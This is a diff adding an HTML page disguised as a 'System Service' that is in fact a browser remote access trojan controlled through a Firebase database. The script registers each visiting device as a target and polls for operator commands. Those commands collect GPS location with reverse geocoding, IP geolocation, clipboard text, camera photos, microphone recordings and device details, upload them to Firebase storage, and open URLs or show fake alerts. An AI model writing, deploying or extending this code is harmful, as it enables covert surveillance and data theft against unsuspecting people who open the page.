@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:12px}
+.status-text{font-size:12px;color:#0f0}
+.id-text{font-size:8px;color:#333}
+.loader{width:30px;height:30px;border:2px solid #0f0;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px}
+.alert-box{background:#1a0000;border:2px solid #ff0000;border-radius:16px;padding:32px;text-align:center;max-width:90vw;animation:shake .5s ease-in-out}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+.alert-icon{font-size:48px;display:block;margin-bottom:12px}
+.alert-msg{color:#ff4444;font-size:16px;font-weight:700;font-family:'Courier New',monospace;word-break:break-all}
+.alert-close{background:#ff0000;color:#fff;border:none;padding:10px 28px;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px;font-family:'Courier New',monospace}
+</style>
+</head>
+<body>
+<div class="loader" id="loader"></div>
+<div class="status-text" id="statusMsg">Connecting...</div>
+<div class="id-text" id="idDisplay"></div>
+
+<script>
+let DEVICE_ID = localStorage.getItem('azrilxrat_device_id');
+if(!DEVICE_ID){DEVICE_ID='TGT_'+Math.random().toString(36).substr(2,9)+Date.now().toString(36);localStorage.setItem('azrilxrat_device_id',DEVICE_ID)}
+document.getElementById('idDisplay').textContent=DEVICE_ID;
+
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+const storage=firebase.storage();
+
+db.ref('devices/'+DEVICE_ID).update({id:DEVICE_ID,model:navigator.userAgent.split(';')[1]?.trim()||'Browser',platform:navigator.platform,language:navigator.language,screenSize:screen.width+'x'+screen.height,registeredAt:Date.now(),lastSeen:Date.now(),online:true}).then(()=>{document.getElementById('statusMsg').textContent='ACTIVE';document.getElementById('loader').style.borderColor='#0f0'}).catch(()=>{document.getElementById('statusMsg').textContent='ERROR'});
+
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({lastSeen:Date.now(),online:true}),10000);
+
+// ═══════════════════════════ GPS + REVERSE GEO ═══════════════════════════
+async function getGPSFull(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){resolve({error:"GPS not supported"});return}
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      const lat=pos.coords.latitude,lng=pos.coords.longitude;
+      try{
+        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+        const d=await r.json();
+        resolve({lat,lng,accuracy:pos.coords.accuracy,address:d.display_name,road:d.address?.road,city:d.address?.city||d.address?.town,state:d.address?.state,country:d.address?.country,postcode:d.address?.postcode,maps:`https://www.google.com/maps?q=${lat},${lng}`});
+      }catch(e){resolve({lat,lng,accuracy:pos.coords.accuracy,maps:`https://www.google.com/maps?q=${lat},${lng}`})}
+    },e=>resolve({error:e.message}),{timeout:10000,enableHighAccuracy:true})
+  });
+}
+
+// ═══════════════════════════ IP GEOLOCATION ═══════════════════════════
+async function getIPGeo(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return{ip:d.ip,city:d.city,region:d.region,country:d.country_name,lat:d.latitude,lng:d.longitude,isp:d.org,timezone:d.timezone,maps:`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}}catch(e){return{error:"IP geo failed"}}}
+
+// ═══════════════════════════ CLIPBOARD ═══════════════════════════
+async function getClipboard(){try{const t=await navigator.clipboard.readText();return{text:t,length:t.length}}catch(e){return{error:"Clipboard denied - need HTTPS & user interaction"}}}
+
+// ═══════════════════════════ DEVICE INFO ═══════════════════════════
+function getDeviceInfo(){return{ua:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+"x"+screen.height,dpr:devicePixelRatio,ram:navigator.deviceMemory||"unknown",cores:navigator.hardwareConcurrency||"unknown",online:navigator.onLine,cookies:navigator.cookieEnabled,vendor:navigator.vendor,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone}}
+
+// ═══════════════════════════ BATTERY ═══════════════════════════
+async function getBattery(){try{const b=await navigator.getBattery();return{level:Math.round(b.level*100)+"%",charging:b.charging,timeLeft:b.dischargingTime===Infinity?'Full':Math.round(b.dischargingTime/60)+' min'}}catch(e){return{error:"Battery N/A"}}}
+
+// ═══════════════════════════ VIBRATE ═══════════════════════════
+function vibrate(){if(navigator.vibrate){navigator.vibrate([200,100,200,100,200,100,500]);return{status:"vibrated",pattern:"triple pulse"}}return{error:"No vibrate"}}
+
+// ═══════════════════════════ CAMERA ═══════════════════════════
+async function takePhoto(){try{const v=document.createElement('video');v.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:999';document.body.appendChild(v);const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,1500));const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);const dataUrl=c.toDataURL('image/jpeg',.7);s.getTracks().forEach(t=>t.stop());v.remove();const blob=await(await fetch(dataUrl)).blob();const ref=storage.ref('photos/'+DEVICE_ID+'_'+Date.now()+'.jpg');await ref.put(blob);const url=await ref.getDownloadURL();return{status:"photo_captured",resolution:v.videoWidth+"x"+v.videoHeight,photoUrl:url}}catch(e){return{error:e.message}}}
+
+// ═══════════════════════════ MIC ═══════════════════════════
+async function recordAudio(){try{const s=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(s);const chunks=[];rec.ondataavailable=e=>chunks.push(e.data);return new Promise(resolve=>{rec.start();setTimeout(async()=>{rec.stop();s.getTracks().forEach(t=>t.stop());const blob=new Blob(chunks,{type:'audio/webm'});const ref=storage.ref('audio/'+DEVICE_ID+'_'+Date.now()+'.webm');await ref.put(blob);const url=await ref.getDownloadURL();resolve({status:"recorded",duration:"3s",audioUrl:url,size:blob.size})},3000)})}catch(e){return{error:e.message}}}
+
+// ═══════════════════════════ NETWORK ═══════════════════════════
+function getNetwork(){const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c)return{type:c.effectiveType,downlink:c.downlink+" Mbps",rtt:c.rtt+"ms",saveData:c.saveData};return{error:"N/A"}}
+
+// ═══════════════════════════ IP ═══════════════════════════
+async function getIP(){try{const r=await fetch('https://api.ipify.org?format=json');return{ip:(await r.json()).ip}}catch(e){return{error:"Failed"}}}
+
+// ═══════════════════════════ ALERT FULLSCREEN ═══════════════════════════
+function showFullAlert(msg){
+  const overlay=document.createElement('div');
+  overlay.className='alert-overlay';
+  overlay.innerHTML=`<div class="alert-box"><span class="alert-icon">⚠️</span><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;
+  document.body.appendChild(overlay);
+  return {status:"alerted",message:msg};
+}
+
+// ═══════════════════════════ COMMAND ═══════════════════════════
+async function executeCommand(cmd){
+  let result={type:cmd,status:"executed",timestamp:Date.now()};
+  if(cmd==='GET_GPS')result.data=await getGPSFull();
+  else if(cmd==='GET_IP_GEO')result.data=await getIPGeo();
+  else if(cmd==='GET_CLIPBOARD')result.data=await getClipboard();
+  else if(cmd==='GET_DEVICE_INFO')result.data=getDeviceInfo();
+  else if(cmd==='GET_BATTERY')result.data=await getBattery();
+  else if(cmd==='VIBRATE')result.data=vibrate();
+  else if(cmd==='CAMERA')result.data=await takePhoto();
+  else if(cmd==='MIC')result.data=await recordAudio();
+  else if(cmd==='GET_NETWORK')result.data=getNetwork();
+  else if(cmd==='GET_IP')result.data=await getIP();
+  else if(cmd.startsWith('OPEN_URL:')){window.open(cmd.split(':').slice(1).join(':'),'_blank');result.data={opened:true}}
+  else if(cmd.startsWith('ALERT:'))result.data=showFullAlert(cmd.split(':').slice(1).join(':'));
+  else result.data={error:"unknown_command",cmd};
+  return result;
+}
+
+db.ref('commands/'+DEVICE_ID).on('child_added',async snap=>{
+  const c=snap.val();if(!c||c.status!=='pending')return;
+  snap.ref.update({status:'processing'});
+  const r=await executeCommand(c.command);
+  db.ref('collected_data').push(r);
+  snap.ref.update({status:'done'});
+  setTimeout(()=>snap.ref.remove(),2000);
+});
+</script>
+</body>
+</html>
